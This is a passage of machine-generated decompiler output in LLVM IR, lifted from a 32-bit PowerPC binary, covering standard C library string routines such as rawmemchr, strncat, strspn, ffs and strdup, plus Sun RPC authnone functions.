  uselistorder i1* %cr7_eq.global-to-local, { 0, 2, 23, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 -8, { 2, 3, 4, 5, 6, 7, 1, 8, 0, 9, 10, 11 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_100136a4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1001369c, { 1, 0 }
  uselistorder label %dec_label_pc_10013694, { 1, 0 }
  uselistorder label %dec_label_pc_10013640, { 1, 0 }
  uselistorder label %dec_label_pc_10013638, { 1, 0 }
  uselistorder label %dec_label_pc_10013630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100134f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100134e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100134e4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100133e0, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_100136b0 = urem i32 %arg1, 256
  store i32 %v1_100136b0, i32* %r4.global-to-local, align 4
  %v0_100136c81 = load i32, i32* @r3, align 4
  %v1_100136c82 = urem i32 %v0_100136c81, 4
  %v3_100136c84 = icmp eq i32 %v1_100136c82, 0
  br i1 %v3_100136c84, label %dec_label_pc_100136d0, label %dec_label_pc_100136b8

dec_label_pc_100136b8:                            ; preds = %entry, %dec_label_pc_100136b8
  %v1_100136bc = phi i32 [ %v0_100136d0.pre, %dec_label_pc_100136b8 ], [ %v1_100136b0, %entry ]
  %v0_100136b8 = phi i32 [ %v1_100136c4, %dec_label_pc_100136b8 ], [ %v0_100136c81, %entry ]
  %v1_100136b8 = inttoptr i32 %v0_100136b8 to i8*
  %v2_100136b8 = load i8, i8* %v1_100136b8, align 1
  %v3_100136b8 = zext i8 %v2_100136b8 to i32
  %v4_100136bc = icmp eq i32 %v3_100136b8, %v1_100136bc
  %v0_100136c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100136bc, i32 %v0_100136c0)
  %v0_100136c4 = load i32, i32* @r3, align 4
  %v1_100136c4 = add i32 %v0_100136c4, 1
  store i32 %v1_100136c4, i32* @r3, align 4
  %v1_100136c8 = urem i32 %v1_100136c4, 4
  %v3_100136c8 = icmp eq i32 %v1_100136c8, 0
  %v0_100136d0.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_100136c8, label %dec_label_pc_100136d0, label %dec_label_pc_100136b8

dec_label_pc_100136d0:                            ; preds = %dec_label_pc_100136b8, %entry
  %v0_100136e89 = phi i32 [ %v0_100136c81, %entry ], [ %v1_100136c4, %dec_label_pc_100136b8 ]
  %v0_100136d0 = phi i32 [ %v1_100136b0, %entry ], [ %v0_100136d0.pre, %dec_label_pc_100136b8 ]
  %v1_100136d0 = mul i32 %v0_100136d0, 256
  %v2_100136d8 = or i32 %v1_100136d0, %v0_100136d0
  %v1_100136e0 = mul i32 %v2_100136d8, 65536
  %v2_100136e4 = or i32 %v1_100136e0, %v2_100136d8
  br label %dec_label_pc_100136e8

dec_label_pc_100136e8:                            ; preds = %dec_label_pc_10013754, %dec_label_pc_100136e8, %dec_label_pc_100136d0
  %v0_10013724 = phi i32 [ %v0_100136e89, %dec_label_pc_100136d0 ], [ %v1_100136ec, %dec_label_pc_100136e8 ], [ %v1_100136ec, %dec_label_pc_10013754 ]
  %v1_100136e8 = inttoptr i32 %v0_10013724 to i32*
  %v2_100136e8 = load i32, i32* %v1_100136e8, align 4
  %v1_100136ec = add i32 %v0_10013724, 4
  %v1_100136f0 = add i32 %v0_10013724, 2
  store i32 %v1_100136f0, i32* @r8, align 4
  %v2_100136f4 = xor i32 %v2_100136e8, %v2_100136e4
  %v1_100136fc = add i32 %v2_100136f4, 2130640639
  %v2_10013700 = xor i32 %v1_100136fc, %v2_100136f4
  %v1_10013704 = add i32 %v0_10013724, 1
  %v2_10013708 = and i32 %v2_10013700, -2130640640
  %v6_10013708 = icmp eq i32 %v2_10013708, -2130640640
  br i1 %v6_10013708, label %dec_label_pc_100136e8, label %dec_label_pc_10013714

dec_label_pc_10013714:                            ; preds = %dec_label_pc_100136e8
  %v2_10013714 = inttoptr i32 %v0_10013724 to i8*
  %v3_10013714 = load i8, i8* %v2_10013714, align 1
  %v4_10013714 = zext i8 %v3_10013714 to i32
  %v1_10013718 = add i32 %v0_10013724, 3
  %v4_1001371c = icmp eq i32 %v4_10013714, %v0_100136d0
  br i1 %v4_1001371c, label %dec_label_pc_10013724, label %dec_label_pc_1001372c

dec_label_pc_10013724:                            ; preds = %dec_label_pc_10013714
  ret i32 %v0_10013724

dec_label_pc_1001372c:                            ; preds = %dec_label_pc_10013714
  %v2_1001372c = inttoptr i32 %v1_10013704 to i8*
  %v3_1001372c = load i8, i8* %v2_1001372c, align 1
  %v4_1001372c = zext i8 %v3_1001372c to i32
  %v4_10013730 = icmp eq i32 %v4_1001372c, %v0_100136d0
  br i1 %v4_10013730, label %dec_label_pc_10013738, label %dec_label_pc_10013740

dec_label_pc_10013738:                            ; preds = %dec_label_pc_1001372c
  ret i32 %v1_10013704

dec_label_pc_10013740:                            ; preds = %dec_label_pc_1001372c
  %v2_10013740 = inttoptr i32 %v1_100136f0 to i8*
  %v3_10013740 = load i8, i8* %v2_10013740, align 1
  %v4_10013740 = zext i8 %v3_10013740 to i32
  %v4_10013744 = icmp eq i32 %v4_10013740, %v0_100136d0
  br i1 %v4_10013744, label %dec_label_pc_1001374c, label %dec_label_pc_10013754

dec_label_pc_1001374c:                            ; preds = %dec_label_pc_10013740
  ret i32 %v1_100136f0

dec_label_pc_10013754:                            ; preds = %dec_label_pc_10013740
  %v2_10013754 = inttoptr i32 %v1_10013718 to i8*
  %v3_10013754 = load i8, i8* %v2_10013754, align 1
  %v4_10013754 = zext i8 %v3_10013754 to i32
  %v4_10013758 = icmp eq i32 %v4_10013754, %v0_100136d0
  br i1 %v4_10013758, label %dec_label_pc_10013760, label %dec_label_pc_100136e8

dec_label_pc_10013760:                            ; preds = %dec_label_pc_10013754
  ret i32 %v1_10013718

; uselistorder directives
  uselistorder i32 %v1_100136ec, { 1, 0 }
  uselistorder i32 %v0_10013724, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_100136d8, { 1, 0 }
  uselistorder i32 %v0_100136d0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_100136c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100136c81, { 2, 1, 0 }
  uselistorder i32 %v1_100136b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100136b8, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001376c

dec_label_pc_1001376c:                            ; preds = %dec_label_pc_1001376c, %entry
  %v0_1001376c = phi i32 [ %v1_10013770, %dec_label_pc_1001376c ], [ %tmp, %entry ]
  %v1_1001376c = inttoptr i32 %v0_1001376c to i8*
  %v2_1001376c = load i8, i8* %v1_1001376c, align 1
  %v1_10013770 = add i32 %v0_1001376c, 1
  store i32 %v1_10013770, i32* %r11.global-to-local, align 4
  %v3_10013774 = icmp eq i8 %v2_1001376c, 0
  store i1 %v3_10013774, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013774, label %dec_label_pc_1001377c, label %dec_label_pc_1001376c

dec_label_pc_1001377c:                            ; preds = %dec_label_pc_1001376c
  %v3_1001377c = icmp eq i32 %arg2, 3
  store i1 %v3_1001377c, i1* %cr7_eq.global-to-local, align 1
  %v1_10013780 = add i32 %v0_1001376c, -1
  store i32 %v1_10013780, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_1001381c, label %dec_label_pc_1001378c

dec_label_pc_1001378c:                            ; preds = %dec_label_pc_1001377c
  %v1_1001378c = udiv i32 %arg2, 4
  store i32 %v1_1001378c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013794

dec_label_pc_10013794:                            ; preds = %dec_label_pc_10013794.dec_label_pc_10013794_crit_edge, %dec_label_pc_1001378c
  %v2_100137a4 = phi i32 [ %v0_10013798.pre, %dec_label_pc_10013794.dec_label_pc_10013794_crit_edge ], [ %v1_10013780, %dec_label_pc_1001378c ]
  %v0_10013794 = load i32, i32* @r4, align 4
  %v1_10013794 = inttoptr i32 %v0_10013794 to i8*
  %v2_10013794 = load i8, i8* %v1_10013794, align 1
  %v1_10013798 = add i32 %v2_100137a4, 1
  store i32 %v1_10013798, i32* %r9.global-to-local, align 4
  %v1_1001379c = add i32 %v2_100137a4, 2
  store i32 %v1_1001379c, i32* @r7, align 4
  %v3_100137a0 = icmp eq i8 %v2_10013794, 0
  store i1 %v3_100137a0, i1* %cr7_eq.global-to-local, align 1
  %v4_100137a4 = inttoptr i32 %v1_10013798 to i8*
  store i8 %v2_10013794, i8* %v4_100137a4, align 1
  %v0_100137a8 = load i32, i32* @r4, align 4
  %v1_100137a8 = add i32 %v0_100137a8, 1
  store i32 %v1_100137a8, i32* %r11.global-to-local, align 4
  %v0_100137ac = load i32, i32* @lr, align 4
  %v1_100137ac = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100137ac, i32 %v0_100137ac)
  %v0_100137b0 = load i32, i32* @r4, align 4
  %v1_100137b0 = add i32 %v0_100137b0, 1
  %v2_100137b0 = inttoptr i32 %v1_100137b0 to i8*
  %v3_100137b0 = load i8, i8* %v2_100137b0, align 1
  %v0_100137b4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100137b4 = add i32 %v0_100137b4, 1
  store i32 %v1_100137b4, i32* @r8, align 4
  %v0_100137b8 = load i32, i32* @r7, align 4
  %v1_100137b8 = add i32 %v0_100137b8, 1
  store i32 %v1_100137b8, i32* @r10, align 4
  %v3_100137bc = icmp eq i8 %v3_100137b0, 0
  store i1 %v3_100137bc, i1* %cr7_eq.global-to-local, align 1
  %v2_100137c0 = load i32, i32* %r9.global-to-local, align 4
  %v3_100137c0 = add i32 %v2_100137c0, 1
  %v4_100137c0 = inttoptr i32 %v3_100137c0 to i8*
  store i8 %v3_100137b0, i8* %v4_100137c0, align 1
  %v0_100137c4 = load i32, i32* @r8, align 4
  %v1_100137c4 = add i32 %v0_100137c4, 1
  store i32 %v1_100137c4, i32* %r9.global-to-local, align 4
  %v1_100137c8 = add i32 %v0_100137c4, 2
  store i32 %v1_100137c8, i32* @r4, align 4
  %v0_100137cc = load i32, i32* @lr, align 4
  %v1_100137cc = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100137cc, i32 %v0_100137cc)
  %v0_100137d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100137d0 = add i32 %v0_100137d0, 1
  %v2_100137d0 = inttoptr i32 %v1_100137d0 to i8*
  %v3_100137d0 = load i8, i8* %v2_100137d0, align 1
  %v0_100137d4 = load i32, i32* @r10, align 4
  %v1_100137d4 = add i32 %v0_100137d4, 1
  store i32 %v1_100137d4, i32* %r11.global-to-local, align 4
  %v3_100137d8 = icmp eq i8 %v3_100137d0, 0
  store i1 %v3_100137d8, i1* %cr7_eq.global-to-local, align 1
  %v2_100137dc = load i32, i32* @r7, align 4
  %v3_100137dc = add i32 %v2_100137dc, 1
  %v4_100137dc = inttoptr i32 %v3_100137dc to i8*
  store i8 %v3_100137d0, i8* %v4_100137dc, align 1
  %v0_100137e0 = load i32, i32* @lr, align 4
  %v1_100137e0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100137e0, i32 %v0_100137e0)
  %v0_100137e4 = load i32, i32* @r8, align 4
  %v1_100137e4 = add i32 %v0_100137e4, 1
  %v2_100137e4 = inttoptr i32 %v1_100137e4 to i8*
  %v3_100137e4 = load i8, i8* %v2_100137e4, align 1
  %v4_100137e4 = zext i8 %v3_100137e4 to i32
  store i32 %v4_100137e4, i32* %r9.global-to-local, align 4
  %v3_100137e8 = icmp eq i8 %v3_100137e4, 0
  store i1 %v3_100137e8, i1* %cr7_eq.global-to-local, align 1
  %v2_100137ec = load i32, i32* @r10, align 4
  %v3_100137ec = add i32 %v2_100137ec, 1
  %v4_100137ec = inttoptr i32 %v3_100137ec to i8*
  store i8 %v3_100137e4, i8* %v4_100137ec, align 1
  %v0_100137f0 = load i32, i32* @lr, align 4
  %v1_100137f0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100137f0, i32 %v0_100137f0)
  %v0_100137f4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100137f4 = add i32 %v0_100137f4, -1
  store i32 %v1_100137f4, i32* %ctr.global-to-local, align 4
  %v2_100137f4 = icmp eq i32 %v1_100137f4, 0
  br i1 %v2_100137f4, label %dec_label_pc_100137f8, label %dec_label_pc_10013794.dec_label_pc_10013794_crit_edge

dec_label_pc_10013794.dec_label_pc_10013794_crit_edge: ; preds = %dec_label_pc_10013794
  %v0_10013798.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013794

dec_label_pc_100137f8:                            ; preds = %dec_label_pc_10013794
  %v0_100137f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100137f8 = urem i32 %v0_100137f8, 4
  store i32 %v1_100137f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001381c

dec_label_pc_10013800:                            ; preds = %dec_label_pc_1001381c, %dec_label_pc_10013800.dec_label_pc_10013800_crit_edge
  %v0_10013804 = phi i32 [ %v0_10013804.pre, %dec_label_pc_10013800.dec_label_pc_10013800_crit_edge ], [ %v0_1001381c, %dec_label_pc_1001381c ]
  %v0_10013800 = load i32, i32* @r4, align 4
  %v1_10013800 = inttoptr i32 %v0_10013800 to i8*
  %v2_10013800 = load i8, i8* %v1_10013800, align 1
  %v3_10013800 = zext i8 %v2_10013800 to i32
  store i32 %v3_10013800, i32* %r9.global-to-local, align 4
  %v1_10013804 = add i32 %v0_10013804, -1
  store i32 %v1_10013804, i32* %r5.global-to-local, align 4
  %v1_10013808 = add i32 %v0_10013800, 1
  store i32 %v1_10013808, i32* @r4, align 4
  %v3_1001380c = icmp eq i8 %v2_10013800, 0
  store i1 %v3_1001380c, i1* %cr7_eq.global-to-local, align 1
  %v2_10013810 = load i32, i32* %r11.global-to-local, align 4
  %v3_10013810 = add i32 %v2_10013810, 1
  %v4_10013810 = inttoptr i32 %v3_10013810 to i8*
  store i8 %v2_10013800, i8* %v4_10013810, align 1
  store i32 %v3_10013810, i32* %r11.global-to-local, align 4
  %v0_10013814 = load i32, i32* @lr, align 4
  %v1_10013814 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013814, i32 %v0_10013814)
  %v0_10013824 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013824 = add i32 %v0_10013824, -1
  store i32 %v1_10013824, i32* %ctr.global-to-local, align 4
  %v2_10013824 = icmp eq i32 %v1_10013824, 0
  br i1 %v2_10013824, label %dec_label_pc_10013828, label %dec_label_pc_10013800.dec_label_pc_10013800_crit_edge

dec_label_pc_10013800.dec_label_pc_10013800_crit_edge: ; preds = %dec_label_pc_10013800
  %v0_10013804.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10013800

dec_label_pc_1001381c:                            ; preds = %dec_label_pc_1001377c, %dec_label_pc_100137f8
  %v0_1001381c = phi i32 [ %arg2, %dec_label_pc_1001377c ], [ %v1_100137f8, %dec_label_pc_100137f8 ]
  store i32 %v0_1001381c, i32* %ctr.global-to-local, align 4
  %v2_100138243 = icmp eq i32 %v0_1001381c, 0
  br i1 %v2_100138243, label %dec_label_pc_10013828, label %dec_label_pc_10013800

dec_label_pc_10013828:                            ; preds = %dec_label_pc_10013800, %dec_label_pc_1001381c
  %v0_10013828 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013828 = icmp eq i32 %v0_10013828, 0
  store i1 %v3_10013828, i1* %cr7_eq.global-to-local, align 1
  %v0_1001382c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10013828, i32 %v0_1001382c)
  %v0_10013830 = load i32, i32* %r5.global-to-local, align 4
  %v1_10013830 = trunc i32 %v0_10013830 to i8
  %v2_10013830 = load i32, i32* %r11.global-to-local, align 4
  %v3_10013830 = add i32 %v2_10013830, 1
  %v4_10013830 = inttoptr i32 %v3_10013830 to i8*
  store i8 %v1_10013830, i8* %v4_10013830, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1001381c, { 1, 2, 0 }
  uselistorder i32 %v1_10013824, { 1, 0 }
  uselistorder i32 %v1_100137f8, { 1, 0 }
  uselistorder i32 %v1_100137f4, { 1, 0 }
  uselistorder i32 %v2_100137a4, { 1, 0 }
  uselistorder i32 %v1_10013770, { 1, 0 }
  uselistorder i32 %v0_1001376c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10013828, { 1, 0 }
  uselistorder label %dec_label_pc_1001381c, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100138681 = load i32, i32* @r3, align 4
  %v1_100138682 = inttoptr i32 %v0_100138681 to i8*
  %v2_100138683 = load i8, i8* %v1_100138682, align 1
  %v3_1001386c6 = icmp eq i8 %v2_100138683, 0
  br i1 %v3_1001386c6, label %dec_label_pc_1001387c, label %dec_label_pc_10013874

dec_label_pc_10013844:                            ; preds = %dec_label_pc_10013844, %dec_label_pc_10013874
  %v0_10013844 = phi i32 [ %v1_10013848, %dec_label_pc_10013844 ], [ %tmp, %dec_label_pc_10013874 ]
  %v1_10013844 = inttoptr i32 %v0_10013844 to i8*
  %v2_10013844 = load i8, i8* %v1_10013844, align 1
  %v1_10013848 = add i32 %v0_10013844, 1
  %v3_1001384c = icmp eq i8 %v2_10013844, 0
  %v4_10013850 = icmp eq i8 %v0_100138508.in, %v2_10013844
  %brmerge = or i1 %v3_1001384c, %v4_10013850
  br i1 %brmerge, label %dec_label_pc_10013858, label %dec_label_pc_10013844

dec_label_pc_10013858:                            ; preds = %dec_label_pc_10013844
  br i1 %v3_1001384c, label %dec_label_pc_1001387c, label %dec_label_pc_10013860

dec_label_pc_10013860:                            ; preds = %dec_label_pc_10013858
  %v1_10013860 = add i32 %v0_10013860, 1
  %v1_10013864 = add i32 %v0_10013864, 1
  %v1_10013868 = inttoptr i32 %v1_10013864 to i8*
  %v2_10013868 = load i8, i8* %v1_10013868, align 1
  %v3_1001386c = icmp eq i8 %v2_10013868, 0
  br i1 %v3_1001386c, label %dec_label_pc_1001387c, label %dec_label_pc_10013874

dec_label_pc_10013874:                            ; preds = %entry, %dec_label_pc_10013860
  %v0_10013864 = phi i32 [ %v1_10013864, %dec_label_pc_10013860 ], [ %v0_100138681, %entry ]
  %v0_10013860 = phi i32 [ %v1_10013860, %dec_label_pc_10013860 ], [ 0, %entry ]
  %v0_100138508.in = phi i8 [ %v2_10013868, %dec_label_pc_10013860 ], [ %v2_100138683, %entry ]
  br label %dec_label_pc_10013844

dec_label_pc_1001387c:                            ; preds = %dec_label_pc_10013860, %dec_label_pc_10013858, %entry
  %v0_1001387c = phi i32 [ 0, %entry ], [ %v1_10013860, %dec_label_pc_10013860 ], [ %v0_10013860, %dec_label_pc_10013858 ]
  ret i32 %v0_1001387c

; uselistorder directives
  uselistorder i32 %v0_10013844, { 1, 0 }
  uselistorder label %dec_label_pc_10013874, { 1, 0 }
  uselistorder label %dec_label_pc_10013844, { 1, 0 }
}

define i32 @ffs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10013884 = urem i32 %arg1, 65536
  %v3_1001388c = icmp eq i32 %v1_10013884, 0
  br i1 %v3_1001388c, label %dec_label_pc_10013894, label %dec_label_pc_1001389c

dec_label_pc_10013894:                            ; preds = %entry
  %v4_10013894 = sdiv i32 %arg1, 65536
  br label %dec_label_pc_1001389c

dec_label_pc_1001389c:                            ; preds = %entry, %dec_label_pc_10013894
  %v0_100138ac = phi i32 [ %arg1, %entry ], [ %v4_10013894, %dec_label_pc_10013894 ]
  %v0_100138a8 = phi i32 [ 1, %entry ], [ 17, %dec_label_pc_10013894 ]
  %v1_1001389c = urem i32 %v0_100138ac, 256
  %v3_100138a0 = icmp eq i32 %v1_1001389c, 0
  br i1 %v3_100138a0, label %dec_label_pc_100138a8, label %dec_label_pc_100138b4

dec_label_pc_100138a8:                            ; preds = %dec_label_pc_1001389c
  %v1_100138a8 = or i32 %v0_100138a8, 8
  %v4_100138ac = sdiv i32 %v0_100138ac, 256
  br label %dec_label_pc_100138b4

dec_label_pc_100138b4:                            ; preds = %dec_label_pc_1001389c, %dec_label_pc_100138a8
  %v0_100138bc = phi i32 [ %v0_100138a8, %dec_label_pc_1001389c ], [ %v1_100138a8, %dec_label_pc_100138a8 ]
  %v0_100138c0 = phi i32 [ %v0_100138ac, %dec_label_pc_1001389c ], [ %v4_100138ac, %dec_label_pc_100138a8 ]
  %v1_100138b4 = urem i32 %v0_100138c0, 16
  %v3_100138b4 = icmp eq i32 %v1_100138b4, 0
  br i1 %v3_100138b4, label %dec_label_pc_100138bc, label %dec_label_pc_100138c8

dec_label_pc_100138bc:                            ; preds = %dec_label_pc_100138b4
  %v1_100138bc = add nsw i32 %v0_100138bc, 4
  %v4_100138c0 = sdiv i32 %v0_100138c0, 16
  %v1_100138c4 = urem i32 %v1_100138bc, 256
  br label %dec_label_pc_100138c8

dec_label_pc_100138c8:                            ; preds = %dec_label_pc_100138b4, %dec_label_pc_100138bc
  %v0_100138d0 = phi i32 [ %v0_100138bc, %dec_label_pc_100138b4 ], [ %v1_100138c4, %dec_label_pc_100138bc ]
  %v0_100138d4 = phi i32 [ %v0_100138c0, %dec_label_pc_100138b4 ], [ %v4_100138c0, %dec_label_pc_100138bc ]
  %v1_100138c8 = urem i32 %v0_100138d4, 4
  %v3_100138c8 = icmp eq i32 %v1_100138c8, 0
  br i1 %v3_100138c8, label %dec_label_pc_100138d0, label %dec_label_pc_100138dc

dec_label_pc_100138d0:                            ; preds = %dec_label_pc_100138c8
  %v1_100138d0 = add nsw i32 %v0_100138d0, 2
  %v4_100138d4 = sdiv i32 %v0_100138d4, 4
  %v1_100138d8 = urem i32 %v1_100138d0, 256
  br label %dec_label_pc_100138dc

dec_label_pc_100138dc:                            ; preds = %dec_label_pc_100138c8, %dec_label_pc_100138d0
  %v0_100138f0 = phi i32 [ %v1_100138d8, %dec_label_pc_100138d0 ], [ %v0_100138d0, %dec_label_pc_100138c8 ]
  %v0_100138e8 = phi i32 [ %v4_100138d4, %dec_label_pc_100138d0 ], [ %v0_100138d4, %dec_label_pc_100138c8 ]
  %v3_100138dc = icmp eq i32 %v0_100138e8, 0
  br i1 %v3_100138dc, label %dec_label_pc_100138f4, label %dec_label_pc_100138e8

dec_label_pc_100138e8:                            ; preds = %dec_label_pc_100138dc
  %v1_100138e8 = urem i32 %v0_100138e8, 2
  %v1_100138ec = xor i32 %v1_100138e8, 1
  %v2_100138f0 = add nsw i32 %v1_100138ec, %v0_100138f0
  br label %dec_label_pc_100138f4

dec_label_pc_100138f4:                            ; preds = %dec_label_pc_100138dc, %dec_label_pc_100138e8
  %storemerge = phi i32 [ %v2_100138f0, %dec_label_pc_100138e8 ], [ 0, %dec_label_pc_100138dc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_100138d4, { 2, 0, 1 }
  uselistorder i32 %v0_100138c0, { 2, 0, 1 }
  uselistorder i32 %v0_100138a8, { 1, 0 }
  uselistorder i32 %v0_100138ac, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100138f4, { 1, 0 }
  uselistorder label %dec_label_pc_100138dc, { 1, 0 }
  uselistorder label %dec_label_pc_100138c8, { 1, 0 }
  uselistorder label %dec_label_pc_100138b4, { 1, 0 }
  uselistorder label %dec_label_pc_1001389c, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10013910 = call i32 @__GI_strlen()
  %v1_10013914 = add i32 %v0_10013910, 1
  store i32 %v1_10013914, i32* @r29, align 4
  store i32 %v1_10013914, i32* @r3, align 4
  store i32 268515616, i32* @lr, align 4
  %v0_1001391c = call i32 @malloc()
  store i32 %v0_1001391c, i32* @r3, align 4
  %v0_10013920 = load i32, i32* @r28, align 4
  store i32 %v0_10013920, i32* @r4, align 4
  store i32 %v0_1001391c, i32* @r31, align 4
  %v3_10013924 = icmp eq i32 %v0_1001391c, 0
  %v0_10013928 = load i32, i32* @r29, align 4
  store i32 %v0_10013928, i32* @r5, align 4
  br i1 %v3_10013924, label %dec_label_pc_10013934, label %dec_label_pc_10013930

dec_label_pc_10013930:                            ; preds = %entry
  store i32 268515636, i32* @lr, align 4
  %v0_10013930 = call i32 @memcpy()
  %v0_10013938.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013934

dec_label_pc_10013934:                            ; preds = %entry, %dec_label_pc_10013930
  %v0_10013938 = phi i32 [ 0, %entry ], [ %v0_10013938.pre, %dec_label_pc_10013930 ]
  ret i32 %v0_10013938

; uselistorder directives
  uselistorder label %dec_label_pc_10013934, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_1001394c = load i32, i32* @r3, align 4
  ret i32 %v0_1001394c
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_10013960 = load i32, i32* @r3, align 4
  ret i32 %v0_10013960
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268515708, i32* @lr, align 4
  %v0_10013978 = call i32 @__rpc_thread_variables()
  store i32 %v0_10013978, i32* %r3.global-to-local, align 4
  %v1_1001397c = add i32 %v0_10013978, 152
  %v2_1001397c = inttoptr i32 %v1_1001397c to i32*
  %v3_1001397c = load i32, i32* %v2_1001397c, align 4
  %v0_10013984 = load i32, i32* @r31, align 4
  store i32 %v0_10013984, i32* %r3.global-to-local, align 4
  %v3_10013988 = icmp eq i32 %v3_1001397c, 0
  br i1 %v3_10013988, label %dec_label_pc_100139ac, label %dec_label_pc_10013994

dec_label_pc_10013994:                            ; preds = %entry
  %v1_10013994 = add i32 %v0_10013984, 4
  %v2_10013994 = inttoptr i32 %v1_10013994 to i32*
  %v3_10013994 = load i32, i32* %v2_10013994, align 4
  %v1_1001399c = add i32 %v3_10013994, 12
  %v2_1001399c = inttoptr i32 %v1_1001399c to i32*
  %v3_1001399c = load i32, i32* %v2_1001399c, align 4
  call void @__pseudo_call(i32 %v3_1001399c)
  %v0_100139a8 = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100139ac

dec_label_pc_100139ac:                            ; preds = %entry, %dec_label_pc_10013994
  %v0_100139ac = phi i32 [ 0, %entry ], [ %v0_100139a8, %dec_label_pc_10013994 ]
  store i32 %v0_100139ac, i32* %r3.global-to-local, align 4
  ret i32 %v0_100139ac

; uselistorder directives
  uselistorder i32 %v0_100139ac, { 1, 0 }
  uselistorder label %dec_label_pc_100139ac, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  store i32 268515800, i32* @lr, align 4
  %v0_100139d4 = call i32 @__rpc_thread_variables()
  %v1_100139d8 = add i32 %v0_100139d4, 152
  %v2_100139d8 = inttoptr i32 %v1_100139d8 to i32*
  %v3_100139d8 = load i32, i32* %v2_100139d8, align 4
  store i32 %v3_100139d8, i32* @r31, align 4
  %v3_100139e8 = icmp eq i32 %v3_100139d8, 0
  br i1 %v3_100139e8, label %dec_label_pc_100139f0, label %dec_label_pc_10013a04

dec_label_pc_100139f0:                            ; preds = %entry
  store i32 268515828, i32* @lr, align 4
  %v2_100139f0 = call i32 @calloc(i32 1, i32 64)
  store i32 %v2_100139f0, i32* @r31, align 4
  %v3_100139f4 = icmp eq i32 %v2_100139f0, 0
  br i1 %v3_100139f4, label %dec_label_pc_10013aa0, label %dec_label_pc_10013a00

dec_label_pc_10013a00:                            ; preds = %dec_label_pc_100139f0
  %v1_10013a00 = load i32, i32* @r30, align 4
  %v2_10013a00 = add i32 %v1_10013a00, 152
